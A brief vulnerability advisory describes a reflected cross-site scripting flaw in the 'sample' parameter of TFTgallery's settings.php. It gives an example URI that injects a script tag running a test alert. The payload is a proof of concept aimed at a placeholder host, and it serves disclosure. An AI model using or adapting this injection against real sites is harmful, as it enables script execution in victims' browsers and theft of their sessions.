TFTgallery 'sample' Parameter Cross Site Scripting Vulnerability

Attackers can exploit this issue by enticing an unsuspecting victim into following a malicious URI.

The following example URI is available:

http://www.example.com/tftgallery/settings.php?sample='&gt;&lt;/link&gt;&lt;script&gt;alert('blake XSS test')&lt;/script&gt;&amp;name=cucumber%20cool
